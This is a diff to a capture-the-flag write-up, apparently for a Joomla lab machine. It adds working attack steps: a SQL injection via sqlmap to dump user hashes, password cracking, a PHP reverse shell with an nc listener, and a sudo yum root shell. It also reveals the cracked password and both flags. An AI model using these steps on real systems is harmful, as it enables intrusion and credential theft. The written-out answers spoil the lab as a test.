@@ -6,6 +6,7 @@
 
 * Nmap
 * Gobuster
+* Joomblah.py
 
 ![IP](./images/IP.png)
 
@@ -139,13 +140,142 @@ Hack into the machine and obtain the root user's credentials.
 
 	![task1-exploit](./images/task1-exploit.png)
 
-* Download `joomblah.py`
+* Method 1 - Use `joomblah.py`
+
+	* Download `joomblah.py`
+		
+		```
+		wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
+		```
+	
+		![task1-joomblah](./images/task1-joomblah.png)
+	
+	* Use `joomblah.py` to enumerate
+	
+		```
+		python joomblah.py http://10.10.27.221
+		```
+	
+		![task1-hash](./images/task1-hash.png)
+
+* Method 2 - Use SQLMap
+
+	* Run script command from exploit file to get DBMS info
+	
+		```
+		sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+		```
+
+		![task1-dbms](./images/task1-dbms.png)
+
+	* Run script again to get info table
+	
+		```
+		sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --tables -D joomla
+		```
+
+		![task1-users](./images/task1-users.png)
+
+	* Run script again to get hash
+	
+		```
+		sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump
+		```
+
+	![task1-table](./images/task1-table.png)
+
+* Save the hash to `hash-jonah.txt` and Use `JohnTheRipper` to crack password
 	
 	```
-	wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
+	john hash-jonah.txt -w=/usr/share/wordlists/rockyou.txt
 	```
 
-	![task1-joomblah](./images/task1-joomblah.png)
+	![task1-password](./images/task1-password.png)
+
+* Login to `http://10.10.27.221/administrator/`, Use template to upload our payload PHP reverser shell
+
+	![task1-template](./images/task1-template.png)
+
+	![task1-protostar](./images/task1-protostar.png)
+
+	![task1-new](./images/task1-new.png)
+
+	![task1-create](./images/task1-create.png)
+
+	![task1-save](./images/task1-save.png)
+
+* Setup listener on our attacker machine
+
+	```
+	nc -nvlp 8888
+	```
+
+	![task1-listener](./images/task1-listener.png)
+
+* Get the shell with access `http://10.10.36.44/templates/protostar/revshell.php`
+
+	![task1-shell](./images/task1-shell.png)
+
+* Create http server on attacker machine to download `linpeas.sh` on target machine
+
+	![task1-http](./images/task1-http.png)
+
+	![task1-download](./images/task1-download.png)
+
+* Run `linpeas.sh`
+
+	```
+	chmod +x linpeas.sh
+	./linpeas.sh
+	```
+
+	![task1-config](./images/task1-config.png)
+
+* Login to `jjameson` and get the flag
+
+	```
+	su jjameson
+	```
+
+	![task1-su](./images/task1-su.png)
+
+* Check `sudo -l`
+
+	![task1-sudo](./images/task1-sudo.png)
+
+* Elevated privileges with sudo yum, copy and paste script from https://gtfobins.github.io/gtfobins/yum/ to shell target
+
+	```
+	TF=$(mktemp -d)
+	cat >$TF/x<<EOF
+	[main]
+	plugins=1
+	pluginpath=$TF
+	pluginconfpath=$TF
+	EOF
+
+	cat >$TF/y.conf<<EOF
+	[main]
+	enabled=1
+	EOF
+
+	cat >$TF/y.py<<EOF
+	import os
+	import yum
+	from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+	requires_api_version='2.1'
+	def init_hook(conduit):
+	  os.execl('/bin/sh','/bin/sh')
+	EOF
+
+	sudo yum -c $TF/x --enableplugin=y
+	```
+
+	![task1-yum](./images/task1-yum.png)
+
+* Get the root file
+
+	![task1-root](./images/task1-root.png)
 
 ### Answer the questions below
 
@@ -159,9 +289,21 @@ Hack into the machine and obtain the root user's credentials.
 
 * What is Jonah's cracked password?
 
+	`spiderman123`
+
+	![task1-password](./images/task1-password.png)
+
 * What is the user flag?
 
+	`27a260fe3cba712cfdedb1c86d80442e`
+
+	![task1-su](./images/task1-su.png)
+
 * What is the root flag?
+
+	`eec3d53292b1821868266858d7fa6f79`
+
+	![task1-root](./images/task1-root.png)
 
 ## Task 3 - Credits
 
